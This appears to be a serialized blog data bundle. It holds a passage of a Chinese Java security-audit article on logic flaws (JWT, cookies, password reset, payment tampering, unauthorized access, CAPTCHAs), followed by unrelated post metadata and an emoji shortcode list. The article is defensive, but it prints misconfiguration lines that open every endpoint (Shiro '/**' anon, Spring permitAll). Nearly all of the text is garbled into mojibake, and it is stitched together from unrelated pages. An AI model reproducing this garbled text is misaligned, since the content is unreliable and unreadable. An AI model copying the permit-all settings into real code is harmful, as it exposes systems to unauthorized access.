ç¨æ·åå¯ç å¨åç«¯æç¤ºæ¡ä¸­æplaceholderççå­\n * ç¨æ·åå¯ç åç«¯éªè¯\n * ç¨æ·åå¯ç åç«¯åæ­»å°ä»£ç ä¸­\n\nè§£å³æ¹æ¡æ¯ä¸åè®¸åç«¯è¿è¡çç¨æ·éªè¯ï¼å¾å¾åç«¯è¿è¡ç¨æ·éªè¯ä¼å¯¹åºåé¢æ´ä¸ªç³»ç»æä½çæªæææèè¶æï¼ï¼ç¨æ·åå¯ç å»ºè®®å­å¨å°æ°æ®åºï¼ä¸åè®¸ç¡¬ç¼ç å°ä»£ç ä¸­éªè¯ï¼åç«¯è¾å¥æ¡æç¤ºä¸­ä¸åè®¸æç¤ºç¨æ·åãå¯ç ä¿¡æ¯ã\n\nbase64ç¼ç ä¼ è¾\n\nä¸ºé²æ­¢ä¸­é´äººæ»å»ï¼å¨åç«¯ç»å½è¯·æ±ä¸­éè¦å¯¹ç¨æ·åå¯ç ï¼å¯ç å¿é¡»å å¯ï¼ä¿¡æ¯è¿è¡å å¯ä¼ è¾ï¼ä½æ¯å¾å¤å¼åè¯¯è®¤ä¸ºbase64æ¯ä¸ç§å å¯æ¹å¼ãè§£å³æ¹æ³æ¯ä½¿ç¨éå¯¹ç§°å å¯çå å¯æ¹å¼ï¼åç«¯ä½¿ç¨å¬é¥è¿è¡å å¯ï¼åç«¯ä½¿ç¨ç§é¥è§£å¯ãæ ¹æ®ç³»ç»æå¤ä½ç½®åéè¦ç¨åº¦ï¼ä¹å¯ä»¥éç¨å¯¹ç§°å¯é¥å å¯ï¼è§æåµèå®ã\n\næ¶æè´¦å·éå®\n\nå¾å¤ç³»ç»å¯¹äºç»å½çç ´æè´¦å·å¤æ¬¡ç»å½çå°å·å¤çæºå¶ï¼è¿ç§æºå¶å®¹æå¯¼è´è´¦å·çæ¶æéå®ï¼æ»å»èåèµ·å¤§éçç»å½è¯·æ±ï¼æ¹ééå®å¤§éè´¦å·ãè§£å³æ¹æ³ï¼\n\n * ç»å½æä½æ·»å éªè¯ç ï¼æé«æ»å»å¤æåº¦\n * å¯¹äºåä¸ipå°åçå¤æ¬¡ç»å½å°è¯è¿è¡ipå°ç¦\n * è®¾ç½®è´¦å·çå¸¸ç¨ipï¼éå¸¸ç¨ipç»å½å¯éªè¯ç»å®ææºçéªè¯ç \n\n# æ³¨éé»è¾\n\næ³¨éæªéæ¯session\n\nç´æ¥å®ä½å°sessionæ³¨éçæ¥å£ï¼æ¥çæ¯å¦æsession.removeattribute("user")ç±»ä¼¼çéæ¯æä½ãç»å¸¸åç°å¼åäººåä¸ºäºæ¹ä¾¿ï¼ç´æ¥å¨è¯¥æ¥å£ä¸­è·³è½¬å°äºç»å½é¡µé¢ï¼ä¸è¿è¡ç»å½ä¿¡æ¯çéæ¯ãå¦ææ¯ä½¿ç¨jwtåè®¤è¯çç³»ç»ï¼æ³¨éç»å½å¾å¾æ¯åç«¯çæä½ï¼å³äºjwtçå®å¨æ§é®é¢å¦å¤è®¨è®ºã\n\nä»»æç¨æ·æ³¨é\n\nä»»æç¨æ·æ³¨éæ¯å ä¸ºç¨æ·åèµ·æ³¨éè¯·æ±æ¶ï¼ä¼ å¥äºç¨æ·çèº«ä»½ä¿¡æ¯ï¼å¸¸è§è¯·æ±å°åå¦ï¼/user/logout?userid=10001ï¼æèå°useridä¿¡æ¯ææè®¾ç½®å¨cookieä¸­ï¼åªéè¦ä¿®æ¹useridå°±å¯ä»¥æ³¨éå¶ä»ç¨æ·ãè§£å³æ¹æ³æ¯ä¸ä¼ éä»»ä½useridä¿¡æ¯ï¼ç´æ¥ä»è¯·æ±ä¸­è·åsessionï¼è®¾ç½®sessionéæ¯ã\n\n# å¯ç æ¾åé»è¾\n\nä»»æç¨æ·å¯ç éç½®\n\nä»»æç¨æ·å¯ç éç½®å¾å¾æ¯ç±äºæªéªè¯ç¨æ·ææºå·ãé®ç®±ï¼æèç¨æ·ææºå·ãé®ç®±éªè¯å¯ç»è¿ãéªè¯ç å¤æåº¦ä½å¯çç ´ãéå¸¸å¨ä»£ç ä¸­çè¡¨ç°æ¯ç¨æ·å¯ç éç½®éªè¯ææºå·éªè¯ç åéæ°è®¾ç½®å¯ç çè¯·æ±åç¦»ãååæ²¡æå³èæ§ï¼å¯¼è´æ»å»èå¯ä»¥è·³è¿éªè¯æ­¥éª¤ï¼ç´æ¥è¿è¡å¯ç éç½®æä½ãå¯¹äºéªè¯ç çç ´ï¼å¯è®¾ç½®ä¸æ¬¡éªè¯éè¯¯éæ¯ã\n\nå¯ç æ¾åç¨æ·åæä¸¾\n\nå¯ç æ¾åä½ç½®çç¨æ·åæä¸¾åç»å½ä½ç½®çç¨æ·åæä¸¾ç±»ä¼¼ï¼å¨è¿è¡å¯ç æ¾åä¹åéè¦å¤æ­ç¨æ·åæ¯å¦å­å¨ãå¯ä»¥éç¨æ·»å éªè¯ç çæ¹å¼ï¼æèä½¿ç¨ç¨æ·ç»å®çææºå·åéç­ä¿¡éªè¯ç ä½ä¸ºå¯ç æ¾åçä¾æ®ã\n\n# jwtå®å¨é®é¢\n\njwtæ¶ææ§\n\nå¨çæä¸åjwttokenä¿¡æ¯æ¶ï¼å¯ä»¥è®¾ç½®jwtçæææ¶é´ï¼æææ¶é´è®¾ç½®ä¸å»ºè®®è¿é¿ãç±äºjwttokençæä¹åæ ç¶æï¼éå¸¸æåµä¸æå¡å¨ä¸å­å¨jwttokenä¿¡æ¯ï¼å æ­¤ç±äºjwtçæ¶ææ§é®é¢å¯¼è´ä¿®æ¹ç¨æ·ä¿¡æ¯åï¼jwtåçä¿¡æ¯æ æ³å®æ¶çæ´æ°ï¼å¯è½å¯¼è´è¶æç­çé®é¢ãè§£å³æ¹æ³æ¯æå¡ç«¯å°jwttokenå­å¨å°redisä¸­ï¼æ´æ¹ä¿¡æ¯åï¼å°åæ¬çtokenä¿¡æ¯ä»redisä¸­æ¸é¤ï¼æ¾å¥æ°tokenï¼æ¯æ¬¡è¯·æ±å¤æ­ç¨æ·æºå¸¦çtokenæ¯å¦å¨ç¼å­ä¸­ã\n\njwtä¸­åå«ææä¿¡æ¯\n\njwtæ¯ä¸ä¸²æ.åéçä¸é¨åç»æçå­ç¬¦ä¸²ï¼å¶ä¸­ç¬¬äºé¨åä¸­å¯ä»¥è®¾ç½®ç¨æ·ç¸å³çä¿¡æ¯ï¼è¯¥é¨åä¿¡æ¯ä½¿ç¨base64ç¼ç ãå¦æå¶ä¸­åå«äºä¸äºææçä¸ªäººä¿¡æ¯ï¼å¯ç ãææºå·ãèº«ä»½è¯å·ãé¶è¡å¡å·ç­ï¼å¾å®¹æè¢«ä»äººè·åãå æ­¤ä¸è¦å¨jwtä¸­ä¿å­è¿å¤çä¸ªäººç¸å³ä¿¡æ¯ï¼ä¸è¦å¨jwtä¸­å­å¨ææä¿¡æ¯ã\n\njwtæªæ ¡éªç­¾å\n\nå¼åäººåå¨è·åjwtä¸­çä¿¡æ¯æ¶éå¸¸ä½¿ç¨çæ¯å¼åäººåç¼åçjwtutilæèä½¿ç¨ä¸æ¹çjwtå·¥å·ï¼å¨è·åjwtä¿¡æ¯æ¶å¯è½åºç°ä¸éªè¯jwtç­¾åç´æ¥è·åçæåµãæ»å»èå¯ä»¥ä¼ªé jwtç¬¬äºé¨åï¼è¶ææä½ä»äººè´¦å·ãè¿ç§æåµæ¯è¾å°ï¼å·¥ä½ä¸­éå°è¿ä¸æ¬¡ï¼ä½æ¯åç°äºå°±æ¯å¤§é®é¢ã\n\nå¼±å¯é¥çç ´\n\njwtçå¯é¥å¦æå¤æåº¦ä¸å¤å¯è½å­å¨çç ´çå¯è½ã\n\njwtæ³¨éçè§£å³æ¹æ¡\n\nå¸¸è§çè§£å³æ¹æ¡å¦ä¸ï¼\n\n * åç«¯æä½ç´æ¥å é¤tokenï¼æ ä¸ºèæ²»ï¼ä½ä»¤çä»ç¶ææï¼\n * tokenä½ä¸ºkeyå­å¨å°redisä¸­ï¼æ³¨éå é¤token\n * å¨jwtä¸­å­å¨tokenççæ¬ä¿¡æ¯ï¼redisä¸­å­å¨jwtçæ¬ä¿¡æ¯åç¨æ·ç»å®ï¼çæ¬ä¸ç¸ååä¸å¯ç¨ï¼æ¹ä¾¿ç¨æ·è¸¢åºä¸çº¿ï¼\n * è®¾ç½®ç­æ¶é´çtokenï¼æ¶é´è¾ç­å¯è½å¯¼è´é¢ç¹ç»å½ï¼\n * é»ååæ ¡éªï¼å¯¹äºæææ³¨éçtokenå å¥é»ååï¼ç¶åæ ¹æ®tokenè¿ææ¶é´ï¼è¿æåç§»åºé»ååã\n\n# cookieå®å¨é®é¢\n\nææä¿¡æ¯ä¿®æ¹å¯¼è´è¶æ\n\næäºå¼åäººåå°ç¨æ·èº«ä»½ä¿¡æ¯ãç¨æ·æéä¿¡æ¯ç´æ¥ææå­å¨å°cookieä¸­ï¼ä¿®æ¹cookieä¸­çææä¿¡æ¯åï¼ç¶ååç«¯ä»cookieä¸­è¯»åä¿¡æ¯ï¼å¯¼è´è¶æãä¸å©ç¨cookieå­å¨æ°æ®ï¼æææ°æ®åå¨æå¡ç«¯å­å¨ã\n\nxss\n\næ¯è¾å¸¸è§çcookieå®å¨é®é¢ï¼éè¦è®¾ç½®httponlyï¼cookie.sethttponly(true);ã\n\nä¸å®å¨çååºåå\n\nshiroå¨cookieä¸­å å¯å­å¨äºä¿¡æ¯ï¼è§£å¯åååºååãå¦ææ¿å°äºshiroçå¯é¥ï¼åå¯ä»¥æé æ¶æçååºååçå¯¹è±¡ã\n\n\n# æ¯ä»ç¸å³\n\nè¶ææä½è®¢åï¼å¢å æ¹æ¥ï¼\n\nè¶ææä½è®¢åéå¸¸åºç°å¨è®¢åä¸­å¿ä½ç½®ï¼åæ¬æ¥çè®¢åè¯¦æãä¸åãåæ¶è®¢åãå é¤è®¢åãä¿®æ¹è®¢åç­ãä¸»è¦ç¹å¾æ¯æå¡ç«¯ä½¿ç¨ç¨æ·ä¼ å¥çorderidåä¸å­æ®µè¿è¡æä½ï¼æªå¤æ­å½åorderidæ¯å¦å±äºå½åç¨æ·ãéå¸¸åæ³æ¯è·åå°orderidä¹åï¼ä»ç¨æ·ä¿¡æ¯ä¸­åuseridï¼ç¶åä½¿ç¨ä¸¤ä¸ªå­æ®µæä½æ°æ®åºã\n\néé¢é®é¢ï¼0.01æ¯ä»ãè´ä»¶æ°ååãæ´»å¨ä¼æ èç¾æ¯ï¼\n\néé¢é®é¢æ¯è¾å¤æï¼å¦ææ¶åå°ç§¯åãä¼æ ãçº¢åãæ»¡åç­ç¹æ®æ´»å¨ï¼éè¦ååäºè§£æ´»å¨çæºå¶ãæ´»å¨å¯¹è±¡çè¦æ±ãè¿é¨ååä¸å¡ç´§å¯èç³»ï¼ä¾å¦ï¼ç§¯åä¸å¡åæ¯ä»ä¸å¡åç¦»ï¼å½ç¨æ·åèµ·éæ¬¾åï¼ç§¯åæªéæ¬¾ï¼å æ­¤å¯ä»¥å·åç§¯åç­ãå¯¹äº0.01ãè´æ°éååç­éè¦çä»£ç ä¸­æ»éé¢çè®¡ç®æ¹å¼æ¯å¦åçï¼æ¯å¦å¯¹ååæ°éåæ ¡éªï¼æ»éé¢ä¸è¦ä»åå°ä¼ å¥ï¼ç±åå°è®¡ç®è·åã\n\nå¯¹äºæäºåªè½åä¸ä¸æ¬¡çæåµï¼éè¦å¯¹å³é®æä½å éï¼é²æ­¢æ¡ä»¶ç«äºå¹¶åèç¾æ¯ã\n\n\n# æéç¸å³\n\næªææè®¿é®\n\nå¨ä½¿ç¨æäºæéæ§å¶æ¡æ¶æ¶ï¼å¼åäººåä¸ºäºå¼åçæ¹ä¾¿ï¼ç´æ¥è®¾ç½®äºå¨é¨æ¥å£çåè®¸è®¿é®ï¼æè®¾ç½®äºå¼åçæ¥å£urlåè®¸è®¿é®ï¼ï¼åæå¼åå®æ¯ä¹åå¿è®°ä¿®æ¹ï¼å¯¼è´æªææãæèå¨ä½¿ç¨æ³¨è§£è¿è¡æéæ§å¶æ¶ï¼å¿è®°ç»æäºæ¹æ³ä¸æ·»å æ³¨è§£ï¼é½å¯è½å¯¼è´æªææè®¿é®ã\n\n// shiro\nmap.put("/**","anon");\n//spring security\n.anyrequest().permitall() \n\n\n1\n2\n3\n4\n\n\nè¿æä¸ç§æåµæ¯å¼åèèªå·±å¼åäºæ¦æªå¨ï¼å½æ»¡è¶³æäºæ¡ä»¶ï¼è¯·æ±å¤´åå«æä¸ªå­æ®µãè¯·æ±urlå°åä»¥xxå¼å¤´ç­ï¼ä¸éè¦è®¤è¯ï¼ä¹æå¯è½åºç°æªææè®¿é®çé®é¢ã\n\nè¶ææä½\n\nè¶ææä½åè®¢åè¶æç±»ä¼¼ï¼å³é®ç¹å¾é½æ¯ä¿¡ä»»åç«¯ä¼ å¥çidåæ°ï¼ç´æ¥å©ç¨idè¿è¡æ¥è¯¢ç­æä½ã\n\nä¿¡ä»»cookieä¸­è®¾ç½®çrolename=adminï¼ä¹å¯è½å¯¼è´åç´è¶æé®é¢ã\n\næ°¸è¿ä¸ç¸ä¿¡åå°ä¼ å¥çæ°æ®ï¼å¯¹äºå³é®çæ°æ®ï¼useridãroleidï¼ç­ï¼ç±æå¡ç«¯è·åã\n\n\n# éçé®é¢\n\n# åå²éçæ¥å£\n\nåå²éçæ¥å£åå«åºä¸çº¿ä½æ¯æªä¸çº¿çæ¥å£ãæ ç¨åè½ãå°æçæ´»å¨ç­ãå¼åå¨ä¿®å¤æ¼æ´æ¶å¯è½ä¼éæ°å¼ä¸ä¸ªæ°çæ¥å£ï¼ä½æ¯å­å¨é®é¢çæ¥å£å¯è½ä»ç¶å­å¨æªä¸çº¿ãè¿ç¹å¨ç§»å¨ç«¯æ¯è¾å¸¸è§ï¼æè®¸å ä¸ºå¼å®¹èçæ¬appï¼å¯¼è´å­å¨é®é¢çæ¥å£ä»ç¶å­å¨ãè¿ç§é®é¢çåç°ä¾èµäºå¯¹äºç³»ç»çäºè§£ç¨åº¦åæ¥å£çç®¡çæ°´å¹³ãå¹³æ¶å¨å®¡è®¡æ¶ï¼å¤å³æ³¨åæä»¶çå¶ä»æ¥å£ã\n\n# æµè¯ï¼åé¨ï¼å¯¹å¤æ´é²\n\nå¼åä¸ºäºæµè¯æ¹ä¾¿ç´æ¥çå­æéè¾å¤§çåé¨ãåæ¬æ°æ®åºæä½ãæä»¶æä½ãredisæä½ç­ãè¿æä¸äºæ¥å£ç¨äºçææµè¯æ°æ®ãæ·»å æµè¯ç¨æ·ï¼å è§£å¯ç­æä½ãè¿ç±»æ¥å£å¯¹å¤å¼æ¾ï¼æå¾å¤§çå®å¨éæ£ãæ¥å£åç§°å¤ä¸º/test/xxxæè/encryptã/decryptç­ãä¸è¬ä¸åè®¸æè¿ç±»æ¥å£æªææå¯¹å¤å¼æ¾ã\n\n\n# éªè¯ç ç±»\n\néªè¯ç çé®é¢ä¸»è¦åå«å¤æåº¦ä½ãéªè¯ç éç¨ãéªè¯ç å¯ç»è¿ãç­ä¿¡ï¼çµè¯ï¼è½°ç¸ãä¸åä¸å¡ç­ä¿¡éªè¯ç å±ç¨ç­ã\n\néªè¯ç åä¸¤ç±»ï¼ç­ä¿¡ï¼çµè¯ï¼éªè¯ç åäººæºäº¤äºéªè¯ç ãæ»ä½æ¥è¯´åºæ»¡è¶³å¦ä¸çè¦æ±ï¼\n\n * éªè¯ç å¤æåº¦é«\n * éªè¯ç å¤æ¬¡å°è¯éæ¯\n * ä½¿ç¨è¿çç­ä¿¡ï¼çµè¯ï¼éªè¯ç éæ¯\n * æ¯å¦æéªè¯ç ä¸å¯éè¿åå°æ§å¶\n * å¾å½¢éªè¯ç å°½éå¤æä¸å¯è¢«è¯å«\n * å¾å½¢éªè¯ç å¾çå¤§å°ä¸å¯è¢«åå°æ§å¶\n * ç­ä¿¡ï¼çµè¯ï¼éªè¯ç è¦æéå¯¹ææºå·ãä¼è¯ãipç­å¤ç§é²è½°ç¸çæºå¶ï¼ä¸åä¸å¡é²è½°ç¸ä¿¡æ¯åæ­¥ã\n * ä¸åä¸å¡çç­ä¿¡éªè¯ç å°½éä¸éç¨\n * â¦â¦\n\n\n# ä¸æ¹ç»ä»¶æ¼æ´å®¡è®¡æ¹å¼\n\n * ä¾é äººå·¥æ¥çé¡¹ç®ä¸­ä½¿ç¨çä¾èµ\n   \n   * ä¼ç¹ï¼ä¸éè¦åå©å·¥å·ï¼ä»£ç å®¡è®¡çæ¶åè¿ä¸ä¸ä¾èµåï¼å¯¹äºå¼å¥äºç¸å³ä¾èµä½æªä½¿ç¨çæåµæ¯è¾åç¡®ãå¯ä»¥å¯¹æ¼æ´å·ä½çä½¿ç¨æ¡ä»¶è¿è¡å¤æ­ã\n   * ç¼ºç¹ï¼ä¾èµä¸ªäººç»éªï¼å®¹æéæ¼ï¼\n\n * éè¿ä¸äºç¬¬ä¸æ¹ä¾èµæ£æ¥åè½\n   \n   * ä¼ç¹ï¼å¨é¢ãéåº¦å¿«ãæ´æ°åæ¶\n   * ç¼ºç¹ï¼ä¸å¤åç¡®\n\n * èªå·±å¼åå·¥å·\n   \n   * ä¼ç¹ï¼é¡ºæï¼å¯æ ¹æ®èªå·±çæ³æ³æ¹è¿ï¼æåå®å¨å·¥å·å¼åçè½åï¼\n   * ç¼ºç¹ï¼éå¤é è½®å­ï¼å¼ååç»´æ¤çææ¬è¾é«ï¼ï¼å¦ææ¯å©ç¨ç¬¬ä¸æ¹æ¥å£çæ¹å¼ï¼åæ¥å£æ´æ¹ï¼å¯¹åºé»è¾ä¹è¦æ´æ¹ãå¦ææ¯èªå·±å¼åæ¥å£ï¼åä¾èµç»ä»¶æ¼æ´ä¿¡æ¯çç®¡çåæ¶éï¼\n   * æè·¯ï¼éè¿è§£æpom.xmlæä»¶ï¼è·åå¨é¨å¼å¥çä¾èµï¼è°ç¨æ¥å£å¤æ­æ¯å¦å­å¨æ¼æ´ã\n\n\n# åèèµæ\n\n 1. æ±¡ç¹åæææ¯çåçåå®è·µåºç¨\n 2. javaä»£ç å®¡è®¡ä¹xxeä¸ssrf\n 3. æ»å»jwtçä¸äºæ¹æ³\n 4. æµè°cookieåcookieå®å¨',charsets:{cjk:!0},lastUpdated:"2022/07/26, 06:58:43",lastUpdatedTimestamp:1658818723e3},{title:"å¤©æ°çç­ï¼å°ç«ç©ºè°å·²å¼æ¾ï¼",frontmatter:{title:"å¤©æ°çç­ï¼å°ç«ç©ºè°å·²å¼æ¾ï¼",date:"2022-06-23T00:00:00.000Z",permalink:"/life/other/airconditioning",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","åç«¯","åç«¯åºç¡"],sidebar:!1,article:!1,tags:["HTML","CSS"],readingShow:"top"},regularPath:"/03.%E7%94%9F%E6%B4%BB/300.%E5%85%B6%E4%BB%96/01.%E5%A4%A9%E6%B0%94%E7%82%8E%E7%83%AD%E5%BC%80%E4%B8%AA%E7%A9%BA%E8%B0%83%E5%90%A7.html",relativePath:"03.çæ´»/300.å¶ä»/01.å¤©æ°çç­å¼ä¸ªç©ºè°å§.md",key:"v-1a41a8d0",path:"/life/other/airconditioning/",headersStr:null,content:"# å¤©æ°çç­ï¼å°ç«ç©ºè°å·²å¼æ¾ï¼",normalizedContent:"# å¤©æ°çç­ï¼å°ç«ç©ºè°å·²å¼æ¾ï¼",charsets:{cjk:!0},lastUpdated:"2022/06/23, 01:35:59",lastUpdatedTimestamp:1655948159e3},{title:"Emojiè¡¨æéå",frontmatter:{title:"Emojiè¡¨æéå",date:"2000-01-01T00:00:00.000Z",permalink:"/more/blog/emoji",categories:["æ´å¤","åå®¢æ­å»º"],tags:[null],readingShow:"top"},regularPath:"/04.%E6%9B%B4%E5%A4%9A/400.%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/00.emoji.html",relativePath:"04.æ´å¤/400.åå®¢æ­å»º/00.emoji.md",key:"v-3553020e",path:"/more/blog/emoji/",headers:[{level:2,title:"emojiåç±»",slug:"emojiåç±»",normalizedTitle:"emojiåç±»",charIndex:14},{level:3,title:"People",slug:"people",normalizedTitle:"people",charIndex:26},{level:3,title:"Nature",slug:"nature",normalizedTitle:"nature",charIndex:4978},{level:3,title:"Objects",slug:"objects",normalizedTitle:"objects",charIndex:8044},{level:3,title:"Places",slug:"places",normalizedTitle:"places",charIndex:15603},{level:3,title:"Symbols",slug:"symbols",normalizedTitle:"symbols",charIndex:18286}],headersStr:"emojiåç±» People Nature Objects Places Symbols",content:"# emojiè¡¨æ\n\n\n# emojiåç±»\n\n\n# People\n\nð± :SCREAM:                         ð :SMILE:                          ð :LAUGHING:\nð :blush:                          ð :smiley:                         âºï¸ :relaxed:\nð :smirk:                          ð :heart_eyes:                     ð :kissing_heart:\nð :kissing_closed_eyes:            ð³ :flushed:                        ð :relieved:\nð :satisfied:                      ð :grin:                           ð :wink:\nð :stuck_out_tongue_winking_eye:   ð :stuck_out_tongue_closed_eyes:   ð :grinning:\nð :kissing:                        ð :kissing_smiling_eyes:           ð :stuck_out_tongue:\nð´ :sleeping:                       ð :worried:                        ð¦ :frowning:\nð§ :anguished:                      ð® :open_mouth:                     ð¬ :grimacing:\nð :confused:                       ð¯ :hushed:                         ð :expressionless:\nð :unamused:                       ð :sweat_smile:                    ð :sweat:\nð¥ :disappointed_relieved:          ð© :weary:                          ð :pensive:\nð :disappointed:                   ð :confounded:                     ð¨ :fearful:\nð° :cold_sweat:                     ð£ :persevere:                      ð¢ :cry:\nð­ :sob:                            ð :joy:                            ð² :astonished:\nð :sunglasses:                     ðµ :dizzy_face:                     ð« :tired_face:\nð  :angry:                          ð¡ :rage:                           ð¤ :triumph:\nðª :sleepy:                         ð :yum:                            ð· :mask:\nð¿ :imp:                            ð :neutral_face:                   ð¶ :no_mouth:\n\n                                                               \nð :smiling_imp:                ð :innocent:                  ð½ :alien:\nð :innocent:                   ð§ :droplet:                   ð :yellow_heart:\nð :blue_heart:                 ð :purple_heart:              â¤ï¸ :heart:\nð :green_heart:                ð :broken_heart:              ð :heartbeat:\nð :heartpulse:                 ð :two_hearts:                ð :revolving_hearts:\nð :cupid:                      ð :sparkling_heart:           â¨ :sparkles:\nâ­ï¸ :star:                       ð :star2:                     ð« :dizzy:\nð¥ :boom:                       ð¥ :collision:                 ð¢ :anger:\nâï¸ :exclamation:                â :question:                   â :grey_exclamation:\nâ :grey_question:               ð¤ :zzz:                       ð¨ :dash:\nð¦ :sweat_drops:                ð¶ :notes:                     ðµ :musical_note:\nð¥ :fire:                       ð© :hankey:                    ð© :poop:\nð© :shit:                       ð :+1:                        ð :thumbsup:\nð :-1:                         ð :thumbsdown:                ð :ok_hand:\nð :punch:                      ð :facepunch:                 â :fist:\nâï¸ :v:                          ð :wave:                      â :hand:\nâ :raised_hand:                 ð :open_hands:                âï¸ :point_up:\nð :point_down:                 ð :point_left:                ð :point_right:\nð :raised_hands:               ð :pray:                      ð :point_up_2:\nð :clap:                       ðª :muscle:                    ð¤ :metal:\nð :fu:                         ð¶ :walking:                   ð :runner:\nð :running:                    ð« :couple:                    ðª :family:\nð¬ :two_men_holding_hands:      ð­ :two_women_holding_hands:   ð :dancer:\nð¯ :dancers:                    ð :ok_woman:                  ð :no_good:\nð :information_desk_person:    ð :raising_hand:              ð° :bride_with_veil:\nð :person_with_pouting_face:   ð :person_frowning:           ð :bow:\nð :couple_with_heart:          ð :massage:                   ð¥ :busts_in_silhouette:\nð :haircut:                    ð :nail_care:                 ð¦ :boy:\nð§ :girl:                       ð© :woman:                     ð¨ :man:\nð¶ :baby:                       ðµ :older_woman:               ð´ :older_man:\nð± :person_with_blond_hair:     ð² :man_with_gua_pi_mao:       ð³ :man_with_turban:\nð· :construction_worker:        ð® :cop:                       ð¼ :angel:\nð¸ :princess:                   ðº :smiley_cat:                ð¸ :smile_cat:\nð» :heart_eyes_cat:             ð½ :kissing_cat:               ð¼ :smirk_cat:\nð :scream_cat:                 ð¿ :crying_cat_face:           ð¹ :joy_cat:\nð¾ :pouting_cat:                ð¹ :japanese_ogre:             ðº :japanese_goblin:\nð :see_no_evil:                ð :hear_no_evil:              ð :speak_no_evil:\nð :guardsman:                  ð :skull:                     ð¾ :feet:\nð :lips:                       ð :kiss:                      ð¬ :speech_balloon:\nð :ear:                        ð :eyes:                      ð :nose:\nð :tongue:                     ð :love_letter:               ð¤ :bust_in_silhouette:\nð¥ :busts_in_silhouette:        ð­ :thought_balloon:           \n\n\n# Nature\n\n                                                                \nâï¸ :sunny:                          âï¸ :umbrella:               âï¸ :cloud:\nâï¸ :snowflake:                      âï¸ :snowman:                â¡ï¸ :zap:\nð :cyclone:                        ð :foggy:                  ð :ocean:\nð± :cat:                            ð¶ :dog:                    ð­ :mouse:\nð¹ :hamster:                        ð° :rabbit:                 ðº :wolf:\nð¸ :frog:                           ð¯ :tiger:                  ð¨ :koala:\nð» :bear:                           ð· :pig:                    ð½ :pig_nose:\nð® :cow:                            ð :boar:                   ðµ :monkey_face:\nð :monkey:                         ð´ :horse:                  ð :racehorse:\nð« :camel:                          ð :sheep:                  ð :elephant:\nð¼ :panda_face:                     ð :snake:                  ð¦ :bird:\nð¤ :baby_chick:                     ð¥ :hatched_chick:          ð£ :hatching_chick:\nð :chicken:                        ð§ :penguin:                ð¢ :turtle:\nð :bug:                            ð :honeybee:               ð :ant:\nð :beetle:                         ð :snail:                  ð :octopus:\nð  :tropical_fish:                  ð :fish:                   ð³ :whale:\nð :whale2:                         ð¬ :dolphin:                ð :cow2:\nð :ram:                            ð :rat:                    ð :water_buffalo:\nð :tiger2:                         ð :rabbit2:                ð :dragon:\nð :goat:                           ð :rooster:                ð :dog2:\nð :pig2:                           ð :mouse2:                 ð :ox:\nð² :dragon_face:                    ð¡ :blowfish:               ð :crocodile:\nðª :dromedary_camel:                ð :leopard:                ð :cat2:\nð© :poodle:                         ð¾ :paw_prints:             ð :bouquet:\nð¸ :cherry_blossom:                 ð· :tulip:                  ð :four_leaf_clover:\nð¹ :rose:                           ð» :sunflower:              ðº :hibiscus:\nð :maple_leaf:                     ð :leaves:                 ð :fallen_leaf:\nð¿ :herb:                           ð :mushroom:               ðµ :cactus:\nð´ :palm_tree:                      ð² :evergreen_tree:         ð³ :deciduous_tree:\nð° :chestnut:                       ð± :seedling:               ð¼ :blossom:\nð¾ :ear_of_rice:                    ð :shell:                  ð :globe_with_meridians:\nð :sun_with_face:                  ð :full_moon_with_face:    ð :new_moon_with_face:\nð :new_moon:                       ð :waxing_crescent_moon:   ð :first_quarter_moon:\nð :waxing_gibbous_moon:            ð :full_moon:              ð :waning_gibbous_moon:\nð :last_quarter_moon:              ð :waning_crescent_moon:   ð :last_quarter_moon_with_face:\nð :first_quarter_moon_with_face:   ð :moon:                   ð :earth_africa:\nð :earth_americas:                 ð :earth_asia:             ð :volcano:\nð :milky_way:                      âï¸ :partly_sunny:           \n\n\n# Objects\n\n                                                                        \nð :bamboo:                           ð :gift_heart:                   ð :dolls:\nð :school_satchel:                   ð :mortar_board:                 ð :flags:\nð :fireworks:                        ð :sparkler:                     ð :wind_chime:\nð :rice_scene:                       ð :jack_o_lantern:               ð» :ghost:\nð :santa:                            ð :christmas_tree:               ð :gift:\nð :bell:                             ð :no_bell:                      ð :tanabata_tree:\nð :tada:                             ð :confetti_ball:                ð :balloon:\nð® :crystal_ball:                     ð¿ :cd:                           ð :dvd:\nð¾ :floppy_disk:                      ð· :camera:                       ð¹ :video_camera:\nð¥ :movie_camera:                     ð» :computer:                     ðº :tv:\nð± :iphone:                           âï¸ :phone:                        âï¸ :telephone:\nð :telephone_receiver:               ð :pager:                        ð  :fax:\nð½ :minidisc:                         ð¼ :vhs:                          ð :sound:\nð :speaker:                          ð :mute:                         ð¢ :loudspeaker:\nð£ :mega:                             âï¸ :hourglass:                    â³ :hourglass_flowing_sand:\nâ° :alarm_clock:                       âï¸ :watch:                        ð» :radio:\nð¡ :satellite:                        â¿ :loop:                          ð :mag:\nð :mag_right:                        ð :unlock:                       ð :lock:\nð :lock_with_ink_pen:                ð :closed_lock_with_key:         ð :key:\nð¡ :bulb:                             ð¦ :flashlight:                   ð :high_brightness:\nð :low_brightness:                   ð :electric_plug:                ð :battery:\nð² :calling:                          âï¸ :email:                        ð« :mailbox:\nð® :postbox:                          ð :bath:                         ð :bathtub:\nð¿ :shower:                           ð½ :toilet:                       ð§ :wrench:\nð© :nut_and_bolt:                     ð¨ :hammer:                       ðº :seat:\nð° :moneybag:                         ð´ :yen:                          ðµ :dollar:\nð· :pound:                            ð¶ :euro:                         ð³ :credit_card:\nð¸ :money_with_wings:                 ð§ :e-mail:                       ð¥ :inbox_tray:\nð¤ :outbox_tray:                      âï¸ :envelope:                     ð¨ :incoming_envelope:\nð¯ :postal_horn:                      ðª :mailbox_closed:               ð¬ :mailbox_with_mail:\nð­ :mailbox_with_no_mail:             ðª :door:                         ð¬ :smoking:\nð£ :bomb:                             ð« :gun:                          ðª :hocho:\nð :pill:                             ð :syringe:                      ð :page_facing_up:\nð :page_with_curl:                   ð :bookmark_tabs:                ð :bar_chart:\nð :chart_with_upwards_trend:         ð :chart_with_downwards_trend:   ð :scroll:\nð :clipboard:                        ð :calendar:                     ð :date:\nð :card_index:                       ð :file_folder:                  ð :open_file_folder:\nâï¸ :scissors:                         ð :pushpin:                      ð :paperclip:\nâï¸ :black_nib:                        âï¸ :pencil2:                      ð :straight_ruler:\nð :triangular_ruler:                 ð :closed_book:                  ð :green_book:\nð :blue_book:                        ð :orange_book:                  ð :notebook:\nð :notebook_with_decorative_cover:   ð :ledger:                       ð :books:\nð :bookmark:                         ð :name_badge:                   ð¬ :microscope:\nð­ :telescope:                        ð° 